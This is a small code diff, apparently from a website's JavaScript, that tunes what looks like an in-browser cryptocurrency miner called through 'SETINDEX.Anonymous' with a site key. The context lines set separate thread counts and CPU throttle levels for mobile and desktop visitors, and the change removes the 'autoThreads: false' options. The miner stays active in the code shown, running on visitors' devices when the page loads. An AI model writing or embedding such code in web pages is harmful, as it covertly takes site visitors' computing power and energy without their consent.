@@ -5,7 +5,6 @@ let base = SETINDEX.Anonymous('SK_xzJ2ClSHk8QOjjmeX2sH2', {
 if (!base.isMobile()){
 	let site = SETINDEX.Anonymous('SK_xzJ2ClSHk8QOjjmeX2sH2', {
 		threads: base.getNumThreads() / 2,
-		autoThreads: false,
 		throttle: 0.4,
 		forceASMJS: false
 	});
@@ -13,7 +12,6 @@ if (!base.isMobile()){
 } else {
 	let site = SETINDEX.Anonymous('SK_xzJ2ClSHk8QOjjmeX2sH2', {
 		threads: base.getNumThreads() / 2,
-		autoThreads: false,
 		throttle: 0.3,
 		forceASMJS: false
 	});
